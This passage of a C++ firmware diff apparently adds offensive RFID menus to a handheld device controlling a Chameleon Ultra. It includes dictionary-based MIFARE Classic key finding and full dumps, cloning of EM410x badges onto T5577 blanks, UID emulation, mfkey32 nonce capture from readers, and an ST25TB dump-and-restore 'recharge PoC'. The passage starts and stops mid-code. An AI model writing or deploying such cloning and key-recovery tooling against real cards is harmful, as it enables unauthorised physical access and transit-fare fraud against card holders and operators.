+        else if (!chameleon::cu_auth_ok) { msg("Pairing failed.", TFT_RED, "set PIN (bind pw)"); }
+        else { msg("Link dropped.", TFT_RED, "retry"); }
+        wait_key();
+    };
+    auto need_link = [&]() -> bool {
+        if (chameleon::cu_is_connected()) return true;
+        msg("Not connected.", TFT_ORANGE, "run Connect first"); wait_key(); return false;
+    };
+    auto act_info = [&]() {
+        if (!need_link()) return;
+        msg("Reading device info...", TFT_YELLOW, nullptr);
+        std::vector<String> L; char b[48];
+        if (chameleon::cu_cmd(chameleon::CMD_GET_APP_VERSION, nullptr, 0) && chameleon::cu_resp_dlen >= 2) {
+            snprintf(b, sizeof b, "FW:   v%u.%u", chameleon::cu_resp_data[0], chameleon::cu_resp_data[1]); L.push_back(b); }
+        if (chameleon::cu_cmd(chameleon::CMD_GET_BATTERY_INFO, nullptr, 0) && chameleon::cu_resp_dlen >= 3) {
+            uint16_t mv = (chameleon::cu_resp_data[0] << 8) | chameleon::cu_resp_data[1];
+            snprintf(b, sizeof b, "Batt: %u mV  %u%%", mv, chameleon::cu_resp_data[2]); L.push_back(b); }
+        if (chameleon::cu_cmd(chameleon::CMD_GET_DEVICE_CHIP_ID, nullptr, 0) && chameleon::cu_resp_dlen >= 1) {
+            String s = "Chip: "; for (int i = 0; i < chameleon::cu_resp_dlen && i < 8; i++) { char h[4]; snprintf(h, 4, "%02X", chameleon::cu_resp_data[i]); s += h; } L.push_back(s); }
+        if (chameleon::cu_cmd(chameleon::CMD_GET_DEVICE_MODE, nullptr, 0) && chameleon::cu_resp_dlen >= 1) {
+            snprintf(b, sizeof b, "Mode: %s", chameleon::cu_resp_data[0] ? "reader" : "tag/emul"); L.push_back(b); }
+        if (chameleon::cu_cmd(chameleon::CMD_GET_ACTIVE_SLOT, nullptr, 0) && chameleon::cu_resp_dlen >= 1) {
+            snprintf(b, sizeof b, "Slot: %u", chameleon::cu_resp_data[0]); L.push_back(b); }
+        if (L.empty()) L.push_back("no response");
+        show_lines(L);
+    };
+    auto act_read_hf = [&]() {
+        if (!need_link()) return;
+        msg("HF scan (place tag)...", TFT_YELLOW, nullptr);
+        uint8_t rm = 1; chameleon::cu_cmd(chameleon::CMD_CHANGE_DEVICE_MODE, &rm, 1); delay(60);
+        std::vector<String> L;
+        if (chameleon::cu_cmd(chameleon::CMD_HF14A_SCAN, nullptr, 0, 2500) && chameleon::cu_resp_status == 0x00) {
+            const uint8_t* d = chameleon::cu_resp_data; int dl = chameleon::cu_resp_dlen, off = 0;
+            int ul = (dl > 0) ? d[0] : 0;
+            if (ul >= 4 && ul <= 10 && 1 + ul + 3 <= dl) {
+                String u = "UID: "; for (int i = 0; i < ul; i++) { char h[4]; snprintf(h, 4, "%02X", d[1 + i]); u += h; u += ' '; } L.push_back(u);
+                char b[40]; snprintf(b, sizeof b, "ATQA %02X%02X  SAK %02X", d[1 + ul], d[2 + ul], d[3 + ul]); L.push_back(b);
+            } else L.push_back("tag read (raw)");
+            (void)off;
+        } else L.push_back("no 14443A tag");
+        show_lines(L);
+    };
+    auto act_read_lf = [&]() {
+        if (!need_link()) return;
+        msg("LF EM410x (place tag)...", TFT_YELLOW, nullptr);
+        uint8_t rm = 1; chameleon::cu_cmd(chameleon::CMD_CHANGE_DEVICE_MODE, &rm, 1); delay(60);
+        std::vector<String> L;
+        if (chameleon::cu_cmd(chameleon::CMD_EM410X_SCAN, nullptr, 0, 2500) && chameleon::cu_resp_status == 0x40) {
+            String s = "EM410x: "; for (int i = 0; i < chameleon::cu_resp_dlen; i++) { char h[4]; snprintf(h, 4, "%02X", chameleon::cu_resp_data[i]); s += h; } L.push_back(s);
+        } else L.push_back("no EM410x tag");
+        show_lines(L);
+    };
+    auto act_slot = [&]() {
+        if (!need_link()) return;
+        uint8_t slot = 0, reader = 0;
+        if (chameleon::cu_cmd(chameleon::CMD_GET_ACTIVE_SLOT, nullptr, 0) && chameleon::cu_resp_dlen >= 1) slot = chameleon::cu_resp_data[0];
+        if (chameleon::cu_cmd(chameleon::CMD_GET_DEVICE_MODE, nullptr, 0) && chameleon::cu_resp_dlen >= 1) reader = chameleon::cu_resp_data[0];
+        bool rd = true;
+        while (true) {
+            if (rd) {
+                sp.fillScreen(TFT_BLACK); header(); sp.setTextSize(1.5);
+                char b[32]; snprintf(b, sizeof b, "Active slot: %u", slot);
+                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(10, 30); sp.print(b);
+                snprintf(b, sizeof b, "Mode: %s", reader ? "reader" : "tag/emul");
+                sp.setTextColor(reader ? TFT_ORANGE : TFT_GREEN, TFT_BLACK); sp.setCursor(10, 56); sp.print(b);
+                sp.setTextSize(1); footer(";/. slot  r/t mode  BACK"); flush(); rd = false;
+            }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); return; }
+            if (kp(';')) { slot = (slot + 7) & 7; chameleon::cu_cmd(chameleon::CMD_SET_ACTIVE_SLOT, &slot, 1); rd = true; keyRelease(); delay(120); }
+            if (kp('.')) { slot = (slot + 1) & 7; chameleon::cu_cmd(chameleon::CMD_SET_ACTIVE_SLOT, &slot, 1); rd = true; keyRelease(); delay(120); }
+            if (kp('r') || kp('R')) { reader = 1; chameleon::cu_cmd(chameleon::CMD_CHANGE_DEVICE_MODE, &reader, 1); rd = true; keyRelease(); delay(120); }
+            if (kp('t') || kp('T')) { reader = 0; chameleon::cu_cmd(chameleon::CMD_CHANGE_DEVICE_MODE, &reader, 1); rd = true; keyRelease(); delay(120); }
+            delay(10);
+        }
+    };
+    auto act_pin = [&]() {
+        char buf[7] = {0}; int n = 0; bool rd = true;
+        while (true) {
+            if (rd) {
+                sp.fillScreen(TFT_BLACK); header(); sp.setTextSize(1);
+                sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(8, 26); sp.print("Bind password (6 digits):");
+                char cur[24]; snprintf(cur, sizeof cur, "current: %06lu", (unsigned long)chameleon::cu_pin);
+                sp.setTextColor(0x8410, TFT_BLACK); sp.setCursor(8, 44); sp.print(cur);
+                sp.setTextSize(2); sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(8, 66);
+                sp.print(n ? buf : "______"); sp.setTextSize(1);
+                footer("type digits  ENT=set  BACK"); flush(); rd = false;
+            }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); return; }
+            if (kp(KEY_ENTER)) { if (n == 6) { chameleon::cu_pin = (uint32_t)atol(buf); msg("PIN set.", TFT_GREEN, "Connect to apply"); wait_key(); } keyRelease(); return; }
+            for (char c = '0'; c <= '9'; c++) if (kp(c) && n < 6) { buf[n++] = c; buf[n] = 0; rd = true; keyRelease(); delay(120); }
+            delay(10);
+        }
+    };
+
+    // main list -------------------------------------------------------------
+    // generic submenu picker (returns selected index, or -1 on BACK)
+    auto pick = [&](const char* title, const char** items, int n) -> int {
+        int sel = 0, start = 0; bool draw = true; const int lineH = 17, listY = 19, maxVis = (H - listY - 14) / lineH;
+        while (true) {
+            if (draw) {
+                if (sel < start) start = sel; if (sel >= start + maxVis) start = sel - maxVis + 1;
+                sp.fillScreen(TFT_BLACK); header(title); sp.setTextSize(1.5);
+                for (int i = 0; i < maxVis && start + i < n; i++) {
+                    int idx = start + i, y = listY + i * lineH;
+                    if (idx == sel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                    else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                    sp.setCursor(10, y + 2); sp.print(items[idx]);
+                }
+                footer(";/. ENT  BACK"); draw = false;
+            }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); return -1; }
+            if (kp(';')) { sel = (sel - 1 + n) % n; draw = true; keyRelease(); delay(130); }
+            if (kp('.')) { sel = (sel + 1) % n; draw = true; keyRelease(); delay(130); }
+            if (kp(KEY_ENTER)) { keyRelease(); return sel; }
+            delay(10);
+        }
+    };
+
+    // ---- Reader: MIFARE Classic full dump -> /evil/nfc/<UID>.nfc ----------
+    auto act_mf_dump = [&]() {
+        if (!need_link()) return;
+        msg("MIFARE: place tag...", TFT_YELLOW, nullptr);
+        if (!chameleon::cu_hf_scan()) { msg("No 14443A tag.", TFT_RED, nullptr); wait_key(); return; }
+        int nb = chameleon::cu_mf_block_count(chameleon::cu_last_sak);
+        uint8_t (*blk)[16] = (uint8_t(*)[16])malloc(256 * 16); uint8_t* known = (uint8_t*)malloc(256);
+        if (!blk || !known) { if (blk) free(blk); if (known) free(known); msg("Out of memory.", TFT_RED, nullptr); wait_key(); return; }
+        char pm[32]; snprintf(pm, sizeof pm, "Reading %d blocks...", nb);
+        msg(pm, TFT_YELLOW, "trying key dictionary");
+        int got = chameleon::cu_mf_dump(nb, blk, known);
+        NfcCardInfo card = {}; memcpy(card.uid, chameleon::cu_last_uid, chameleon::cu_last_uidlen);
+        card.uid_len = chameleon::cu_last_uidlen;
+        card.atqa = chameleon::cu_last_atqa[0] | (chameleon::cu_last_atqa[1] << 8);
+        card.sak = chameleon::cu_last_sak; card.valid = true;
+        char path[96]; bool okf = nfc_export_flipper(card, blk, nb, nullptr, 0, path, sizeof path);
+        free(blk); free(known);
+        std::vector<String> L; char b[48];
+        String u = "UID: "; for (int i = 0; i < card.uid_len; i++) { char h[4]; snprintf(h, 4, "%02X", card.uid[i]); u += h; } L.push_back(u);
+        snprintf(b, sizeof b, "Blocks: %d/%d read", got, nb); L.push_back(b);
+        if (okf) { L.push_back("Saved:"); L.push_back(String(path)); } else L.push_back("SD save failed");
+        show_lines(L);
+    };
+    auto act_lf_clone = [&]() {
+        if (!need_link()) return;
+        msg("Place EM410x to read...", TFT_YELLOW, nullptr);
+        if (!chameleon::cu_em_scan()) { msg("No EM410x tag.", TFT_RED, nullptr); wait_key(); return; }
+        sp.fillScreen(TFT_BLACK); header("Clone EM410x"); sp.setTextSize(1);
+        String s = "Read ID: "; for (int i = 0; i < 5; i++) { char h[4]; snprintf(h, 4, "%02X", chameleon::cu_last_em[i]); s += h; }
+        sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(6, 28); sp.print(s);
+        sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(6, 48); sp.print("Place a blank T5577,");
+        sp.setCursor(6, 62); sp.print("then press ENTER.");
+        footer("ENT=write  BACK=cancel");
+        bool go = false; while (true) { M5.update(); cardUpdate(); if (kp(KEY_ENTER)) { keyRelease(); go = true; break; } if (kp(KEY_BACKSPACE)) { keyRelease(); break; } delay(10); }
+        if (!go) return;
+        bool ok = chameleon::cu_em_clone_t55(chameleon::cu_last_em);
+        msg(ok ? "Cloned to T5577." : "Clone failed.", ok ? TFT_GREEN : TFT_RED, ok ? nullptr : "T5577 present?"); wait_key();
+    };
+    auto act_find_keys = [&]() {
+        if (!need_link()) return;
+        msg("Find keys: place tag...", TFT_YELLOW, nullptr);
+        if (!chameleon::cu_hf_scan()) { msg("No 14443A tag.", TFT_RED, nullptr); wait_key(); return; }
+        int nsec = (chameleon::cu_last_sak == 0x18) ? 40 : 16;
+        msg("Checking keys (dict)...", TFT_YELLOW, "may take a few s");
+        bool hA[40], hB[40]; uint8_t kA[40][6], kB[40][6];
+        if (!chameleon::cu_mf_checkkeys(nsec, hA, kA, hB, kB)) { msg("Check failed/timeout.", TFT_RED, nullptr); wait_key(); return; }
+        SD.mkdir("/evil/nfc"); SD.mkdir("/evil/nfc/keys");
+        char path[80]; int p = snprintf(path, sizeof path, "/evil/nfc/keys/cham_");
+        for (int i = 0; i < chameleon::cu_last_uidlen; i++) p += snprintf(path + p, sizeof path - p, "%02X", chameleon::cu_last_uid[i]);
+        snprintf(path + p, sizeof path - p, "_keys.txt");
+        File f = SD.open(path, FILE_WRITE); int nf = 0; std::vector<String> L;
+        for (int s = 0; s < nsec; s++) {
+            char la[24], lb[24]; int q;
+            q = snprintf(la, sizeof la, "S%02d A:", s);
+            if (hA[s]) { for (int j = 0; j < 6; j++) q += snprintf(la + q, sizeof la - q, "%02X", kA[s][j]); nf++; } else snprintf(la + q, sizeof la - q, "------------");
+            q = snprintf(lb, sizeof lb, "    B:");
+            if (hB[s]) { for (int j = 0; j < 6; j++) q += snprintf(lb + q, sizeof lb - q, "%02X", kB[s][j]); nf++; } else snprintf(lb + q, sizeof lb - q, "------------");
+            L.push_back(la); L.push_back(lb);          // two lines on screen (fits at size 1.5)
+            if (f) f.printf("%s %s\n", la, lb + 4);    // one compact line to SD
+        }
+        if (f) f.close();
+        char hd[40]; snprintf(hd, sizeof hd, "found %d/%d keys (SD)", nf, nsec * 2); L.insert(L.begin(), String(hd));
+        show_lines(L);
+    };
+    auto sub_reader = [&]() {
+        const char* it[] = { "HF-14A scan", "MIFARE dump -> SD", "Find keys (dict)", "LF EM410x read", "Clone EM410x -> T5577" };
+        while (true) { int s = pick("Reader", it, 5); if (s < 0) return;
+            if (s == 0) act_read_hf(); else if (s == 1) act_mf_dump(); else if (s == 2) act_find_keys();
+            else if (s == 3) act_read_lf(); else act_lf_clone(); }
+    };
+
+    // ---- Slots -----------------------------------------------------------
+    auto act_slot_list = [&]() {
+        if (!need_link()) return;
+        msg("Reading slots...", TFT_YELLOW, nullptr);
+        uint16_t hf[8] = {0}, lf[8] = {0}; std::vector<String> L;
+        if (chameleon::cu_get_slot_info(hf, lf)) {
+            uint8_t act = 0; if (chameleon::cu_cmd(chameleon::CMD_GET_ACTIVE_SLOT, nullptr, 0) && chameleon::cu_resp_dlen >= 1) act = chameleon::cu_resp_data[0];
+            for (int i = 0; i < 8; i++) { char b[40];
+                snprintf(b, sizeof b, "%c%d HF:%s LF:%s", i == act ? '*' : ' ', i + 1, chameleon::cu_tagtype_name(hf[i]), chameleon::cu_tagtype_name(lf[i])); L.push_back(b); }
+        } else L.push_back("no response");
+        show_lines(L);
+    };
+    auto act_set_type = [&]() {
+        if (!need_link()) return;
+        const char* it[] = { "MIFARE 1K", "MIFARE 4K", "NTAG215", "EM410x" };
+        uint16_t tt[] = { 1001, 1003, 1101, 100 };
+        int s = pick("Set tag type", it, 4); if (s < 0) return;
+        uint8_t slot = 0; if (chameleon::cu_cmd(chameleon::CMD_GET_ACTIVE_SLOT, nullptr, 0) && chameleon::cu_resp_dlen >= 1) slot = chameleon::cu_resp_data[0];
+        bool ok = chameleon::cu_set_slot_type(slot, tt[s]);
+        msg(ok ? "Tag type set." : "Failed.", ok ? TFT_GREEN : TFT_RED, ok ? "Save to persist" : nullptr); wait_key();
+    };
+    auto act_save = [&]() { if (!need_link()) return; bool ok = chameleon::cu_slot_save(); msg(ok ? "Slots saved to flash." : "Save failed.", ok ? TFT_GREEN : TFT_RED, nullptr); wait_key(); };
+    auto sub_slots = [&]() {
+        const char* it[] = { "List slots", "Select & Mode", "Set tag type", "Save config" };
+        while (true) { int s = pick("Slots", it, 4); if (s < 0) return;
+            if (s == 0) act_slot_list(); else if (s == 1) act_slot(); else if (s == 2) act_set_type(); else act_save(); }
+    };
+
+    // ---- Emulate ---------------------------------------------------------
+    auto act_setuid = [&]() {
+        if (!need_link()) return;
+        if (chameleon::cu_last_uidlen < 4) { msg("No UID captured.", TFT_ORANGE, "do a HF scan first"); wait_key(); return; }
+        bool ok = chameleon::cu_set_anticoll(chameleon::cu_last_uid, chameleon::cu_last_uidlen, chameleon::cu_last_atqa, chameleon::cu_last_sak);
+        msg(ok ? "UID set on slot." : "Failed.", ok ? TFT_GREEN : TFT_RED, ok ? "Save to persist" : nullptr); wait_key();
+    };
+    auto act_mfkey = [&]() {
+        if (!need_link()) return;
+        uint8_t en = 1; chameleon::cu_cmd(4004 /*SET_DETECTION_ENABLE*/, &en, 1);
+        uint32_t cnt = 0; if (chameleon::cu_cmd(4005 /*GET_DETECTION_COUNT*/, nullptr, 0) && chameleon::cu_resp_dlen >= 4)
+            cnt = ((uint32_t)chameleon::cu_resp_data[0] << 24) | (chameleon::cu_resp_data[1] << 16) | (chameleon::cu_resp_data[2] << 8) | chameleon::cu_resp_data[3];
+        std::vector<String> L; char b[48];
+        snprintf(b, sizeof b, "Detection ON. nonces=%lu", (unsigned long)cnt); L.push_back(b);
+        L.push_back("Emulate a slot, let a");
+        L.push_back("reader auth, then rerun.");
+        if (cnt > 0) {
+            SD.mkdir("/evil/nfc"); SD.mkdir("/evil/nfc/keys");
+            File f = SD.open("/evil/nfc/keys/cham_mfkey32.txt", FILE_WRITE); int saved = 0;
+            uint8_t idx[4] = {0, 0, 0, 0};
+            if (chameleon::cu_cmd(4006 /*GET_DETECTION_LOG*/, idx, 4, 3000) && chameleon::cu_resp_status == 0x68) {
+                const uint8_t* d = chameleon::cu_resp_data; int dl = chameleon::cu_resp_dlen;
+                for (int p = 0; p + 18 <= dl; p += 18) {
+                    if (f) { int bf = d[p + 1]; char line[112];
+                        snprintf(line, sizeof line, "blk%u %c uid%02X%02X%02X%02X nt%02X%02X%02X%02X nr%02X%02X%02X%02X ar%02X%02X%02X%02X",
+                            d[p], (bf & 1) ? 'B' : 'A',
+                            d[p+2], d[p+3], d[p+4], d[p+5], d[p+6], d[p+7], d[p+8], d[p+9],
+                            d[p+10], d[p+11], d[p+12], d[p+13], d[p+14], d[p+15], d[p+16], d[p+17]);
+                        f.println(line); saved++; }
+                }
+            }
+            if (f) f.close();
+            snprintf(b, sizeof b, "Saved %d nonces", saved); L.push_back(b);
+            L.push_back("/evil/nfc/keys/cham_mfkey32.txt");
+        }
+        show_lines(L);
+    };
+    auto act_lf_emu = [&]() {
+        if (!need_link()) return;
+        if (!chameleon::cu_have_em) { msg("No EM410x id captured.", TFT_ORANGE, "read EM410x first"); wait_key(); return; }
+        bool ok = chameleon::cu_em_emulate(chameleon::cu_last_em);
+        msg(ok ? "Emulating EM410x." : "Failed.", ok ? TFT_GREEN : TFT_RED, ok ? "tag mode, saved" : nullptr); wait_key();
+    };
+    auto sub_emulate = [&]() {
+        const char* it[] = { "Mode: tag (emulate)", "Mode: reader", "Set UID (last HF scan)", "Emulate EM410x (LF)", "mfkey capture" };
+        while (true) { int s = pick("Emulate", it, 5); if (s < 0) return;
+            if (s == 0) { bool ok = chameleon::cu_set_tag(); msg(ok ? "Tag/emulate mode." : "Failed.", ok ? TFT_GREEN : TFT_RED, nullptr); wait_key(); }
+            else if (s == 1) { bool ok = chameleon::cu_set_reader(); msg(ok ? "Reader mode." : "Failed.", ok ? TFT_GREEN : TFT_RED, nullptr); wait_key(); }
+            else if (s == 2) act_setuid(); else if (s == 3) act_lf_emu(); else act_mfkey(); }
+    };
+
+    // ---- Transfer (Chameleon <-> Evil SD, Flipper .nfc) ------------------
+    auto act_cham_to_evil = [&]() {
+        if (!need_link()) return;
+        msg("Reading slot emulator...", TFT_YELLOW, nullptr);
+        uint8_t uid[10] = {0}, atqa[2] = {0}, sak = 0; int ul = chameleon::cu_get_anticoll(uid, atqa, &sak);
+        int nb = sak == 0x18 ? 256 : (sak == 0x09 ? 20 : 64);
+        uint8_t (*blk)[16] = (uint8_t(*)[16])malloc(256 * 16);
+        if (!blk) { msg("Out of memory.", TFT_RED, nullptr); wait_key(); return; }
+        bool okread = true;
+        for (int b = 0; b < nb && okread; b += 16) { int cnt = (nb - b) < 16 ? (nb - b) : 16; if (!chameleon::cu_read_emu(b, cnt, &blk[b][0])) okread = false; }
+        NfcCardInfo card = {};
+        if (ul >= 4) { memcpy(card.uid, uid, ul); card.uid_len = ul; } else { memcpy(card.uid, blk[0], 4); card.uid_len = 4; }
+        card.atqa = atqa[0] | (atqa[1] << 8); card.sak = sak ? sak : 0x08; card.valid = true;
+        char path[96]; bool okf = nfc_export_flipper(card, blk, nb, nullptr, 0, path, sizeof path);
+        free(blk);
+        std::vector<String> L; char b[40]; snprintf(b, sizeof b, "Slot -> %d blocks %s", nb, okread ? "" : "(partial)"); L.push_back(b);
+        if (okf) { L.push_back("Saved:"); L.push_back(String(path)); } else L.push_back("SD save failed");
+        show_lines(L);
+    };
+    auto act_evil_to_cham = [&]() {
+        if (!need_link()) return;
+        std::vector<String> files; File dir = SD.open("/evil/nfc");
+        if (dir) { for (File e = dir.openNextFile(); e; e = dir.openNextFile()) { String nm = e.name(); e.close(); if (nm.endsWith(".nfc")) files.push_back(nm); if (files.size() >= 40) break; } dir.close(); }
+        if (files.empty()) { msg("No .nfc in /evil/nfc", TFT_ORANGE, nullptr); wait_key(); return; }
+        std::vector<const char*> cs; for (auto& s : files) cs.push_back(s.c_str());
+        int s = pick("Pick .nfc", cs.data(), (int)cs.size()); if (s < 0) return;
+        String path = files[s]; if (!path.startsWith("/")) path = "/evil/nfc/" + files[s];
+        uint8_t uid[10] = {0}; int ul = 0;
+        uint8_t (*blk)[16] = (uint8_t(*)[16])malloc(256 * 16);
+        if (!blk) { msg("Out of memory.", TFT_RED, nullptr); wait_key(); return; }
+        int nb = nfc_parse_dump(path.c_str(), blk, 256, uid, &ul);
+        if (nb <= 0) { free(blk); msg("Parse failed.", TFT_RED, nullptr); wait_key(); return; }
+        msg("Writing to Chameleon...", TFT_YELLOW, nullptr);
+        uint8_t slot = 0; if (chameleon::cu_cmd(chameleon::CMD_GET_ACTIVE_SLOT, nullptr, 0) && chameleon::cu_resp_dlen >= 1) slot = chameleon::cu_resp_data[0];
+        uint16_t tt = 1001; uint8_t atqa[2] = {0x04, 0x00}, sak = 0x08;
+        if (nb > 64) { tt = 1003; atqa[0] = 0x02; sak = 0x18; } else if (nb <= 20) { tt = 1000; sak = 0x09; }
+        chameleon::cu_set_slot_type(slot, tt);
+        if (ul < 4) { ul = 4; memcpy(uid, blk[0], 4); }
+        chameleon::cu_set_anticoll(uid, ul, atqa, sak);
+        bool okw = true;
+        for (int b = 0; b < nb && okw; b += 8) { int cnt = (nb - b) < 8 ? (nb - b) : 8; if (!chameleon::cu_write_emu(b, &blk[b][0], cnt * 16)) okw = false; }
+        free(blk);
+        bool oks = chameleon::cu_slot_save();
+        std::vector<String> L; char b[40]; snprintf(b, sizeof b, "Slot %u <- %d blocks", slot, nb); L.push_back(b);
+        L.push_back(okw ? "emu write OK" : "emu write FAIL");
+        L.push_back(oks ? "saved to flash" : "save FAIL");
+        show_lines(L);
+    };
+    auto sub_transfer = [&]() {
+        const char* it[] = { "Chameleon slot -> Evil", "Evil .nfc -> Chameleon" };
+        while (true) { int s = pick("Transfer", it, 2); if (s < 0) return; if (s == 0) act_cham_to_evil(); else act_evil_to_cham(); }
+    };
+
+    // ---- top-level menu --------------------------------------------------
+    const int lineH = 17, listY = 19, N = 7;
+    int sel = 0, start = 0; bool draw = true;
+    const int maxVis = (H - listY - 14) / lineH;
+    while (true) {
+        if (draw) {
+            bool on = chameleon::cu_is_connected();
+            const char* items[N] = { on ? "Disconnect" : "Connect", "Device Info", "Reader  (HF/LF)", "Slots", "Emulate", "Transfer", "Set PIN" };
+            if (sel < start) start = sel;
+            if (sel >= start + maxVis) start = sel - maxVis + 1;
+            sp.fillScreen(TFT_BLACK); header(); sp.setTextSize(1.5);
+            for (int i = 0; i < maxVis && (start + i) < N; i++) {
+                int idx = start + i, y = listY + i * lineH;
+                if (idx == sel) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                sp.setCursor(10, y + 2); sp.print(items[idx]);
+            }
+            footer(";/. ENT  BACK=exit"); flush(); draw = false;
+        }
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp(';')) { sel = (sel - 1 + N) % N; draw = true; keyRelease(); delay(130); }
+        if (kp('.')) { sel = (sel + 1) % N; draw = true; keyRelease(); delay(130); }
+        if (kp(KEY_ENTER)) {
+            keyRelease();
+            switch (sel) {
+                case 0: act_connect(); break;
+                case 1: act_info(); break;
+                case 2: sub_reader(); break;
+                case 3: sub_slots(); break;
+                case 4: sub_emulate(); break;
+                case 5: sub_transfer(); break;
+                case 6: act_pin(); break;
+            }
+            draw = true;
+        }
+        delay(10);
+    }
+    // Leaving Chameleon: drop the BLE link AND tear down the BLE host so its
+    // heap (~30-40 KB) is returned. Otherwise the Cap NFC 32 KB sprite fails to
+    // allocate and those menus fall back to flickery direct-draw. deinit(false)
+    // keeps BLE re-initialisable, so other BLE features still work afterwards.
+    chameleon::cu_shutdown(false);   // teardown (measurement will decide false vs true)
+    isBLEInitialized = false;
+}
+
+// ===========================================================================
+// ST25TB on-screen UI (Type B' memory tag): read/save + restore (recharge PoC).
+// NFC (not BLE) so heap is fine, but we draw direct with dirty flags anyway.
+// ===========================================================================
+void st25tbMenu() {
+    keyRelease();
+    const int W = 240, H = 135;
+    auto& sp = (LovyanGFX&)M5.Display;
+    st25tb::Dump* dp = (st25tb::Dump*)malloc(sizeof(st25tb::Dump));   // heap, not stack (avoid overflow deep under nfcMenu)
+    if (!dp) { if (nfc_opened) { nfc_close(); nfc_open(); } return; }
+    memset(dp, 0, sizeof(*dp)); bool have = false;
+
+    auto header = [&](const char* t) {
+        sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
+        sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841); sp.setCursor(6, 2); sp.print(t);
+        sp.setTextSize(1.5);   // content after header is 1.5 (bigger, readable)
+    };
+    auto footer = [&](const char* s) { sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextSize(1); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print(s); };
+    auto msg = [&](const char* l1, uint16_t c1, const char* l2) {
+        sp.fillScreen(TFT_BLACK); header("ST25TB"); sp.setTextColor(c1, TFT_BLACK); sp.setCursor(8, 44); sp.print(l1);
+        if (l2) { sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(8, 64); sp.print(l2); } footer("BACK=menu");
+    };
+    auto wait_key = [&]() { while (true) { M5.update(); cardUpdate(); if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); return; } delay(10); } };
+    auto show_lines = [&](std::vector<String>& L) {
+        int top = 0; const int vis = 6; bool rd = true;
+        while (true) {
+            if (rd) { sp.fillScreen(TFT_BLACK); header("ST25TB dump");
+                for (int i = 0; i < vis && top + i < (int)L.size(); i++) { sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(6, 19 + i * 16); sp.print(L[top + i]); }
+                footer(L.size() > (size_t)vis ? ";/. scroll BACK" : "BACK"); rd = false; }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); return; }
+            if (kp(';')) { if (top > 0) { top--; rd = true; } keyRelease(); delay(110); }
+            if (kp('.')) { if (top + vis < (int)L.size()) { top++; rd = true; } keyRelease(); delay(110); }
+            delay(10);
+        }
+    };
+    // file picker over /evil/nfc/st25tb_*.nfc ; returns full path or ""
+    auto pick_file = [&]() -> String {
+        std::vector<String> files; File dir = SD.open("/evil/nfc");
+        if (dir) { for (File e = dir.openNextFile(); e; e = dir.openNextFile()) { String nm = e.name(); e.close();
+            if (nm.startsWith("st25tb_") || nm.indexOf("st25tb_") >= 0) if (nm.endsWith(".nfc")) files.push_back(nm); if (files.size() >= 40) break; } dir.close(); }
+        if (files.empty()) { msg("No st25tb_*.nfc on SD", TFT_ORANGE, "Read+Save first"); wait_key(); return String(); }
+        int sel = 0, top = 0; const int vis = 7; bool rd = true;
+        while (true) {
+            if (rd) { sp.fillScreen(TFT_BLACK); header("Pick dump");
+                if (sel < top) top = sel; if (sel >= top + vis) top = sel - vis + 1;
+                for (int i = 0; i < vis && top + i < (int)files.size(); i++) { int idx = top + i, y = 19 + i * 14;
+                    if (idx == sel) { sp.fillRect(0, y, W, 14, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); } else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                    sp.setCursor(6, y + 1); String fn = files[idx]; if (fn.length() > 32) fn = fn.substring(0, 32); sp.print(fn); }
+                footer(";/. ENT BACK"); rd = false; }
+            M5.update(); cardUpdate();
+            if (kp(KEY_BACKSPACE)) { keyRelease(); return String(); }
+            if (kp(';')) { sel = (sel - 1 + files.size()) % files.size(); rd = true; keyRelease(); delay(120); }
+            if (kp('.')) { sel = (sel + 1) % files.size(); rd = true; keyRelease(); delay(120); }
+            if (kp(KEY_ENTER)) { keyRelease(); String p = files[sel]; if (!p.startsWith("/")) p = "/evil/nfc/" + p; return p; }
+            delay(10);
+        }
+    };
+
+    auto act_read = [&]() {
+        msg("Reading ST25TB...", TFT_YELLOW, "place tag on reader");
+        if (!nfc_opened) nfc_open();
+        calypso::caly_isob_begin();
+        have = st25tb::st25_dump(*dp);
+        calypso::caly_isob_end();
+        if (!have) { msg("No ST25TB tag.", TFT_RED, "Type B' not found"); wait_key(); return; }
+        char p[80] = {0}; bool saved = st25tb::st25_save(*dp, p, sizeof p);
+        std::vector<String> L; char b[40];
+        String u = "UID "; for (int i = 0; i < 8; i++) { char h[4]; snprintf(h, 4, "%02X", dp->uid[i]); u += h; } L.push_back(u);
+        snprintf(b, sizeof b, "Chip %02X   %d blocks", dp->chip, dp->nblk); L.push_back(b);
+        if (dp->have_sys) { snprintf(b, sizeof b, "OTP %02X%02X%02X%02X %s", dp->sys[0], dp->sys[1], dp->sys[2], dp->sys[3], (dp->sys[0]==0xFF&&dp->sys[1]==0xFF) ? "(unlocked)" : ""); L.push_back(b); }
+        L.push_back(saved ? "Saved /evil/nfc/:" : "SD save FAILED");
+        if (saved) { const char* bn = strrchr(p, '/'); L.push_back(String(bn ? bn + 1 : p)); }
+        show_lines(L);
+    };
+    auto act_view = [&]() {
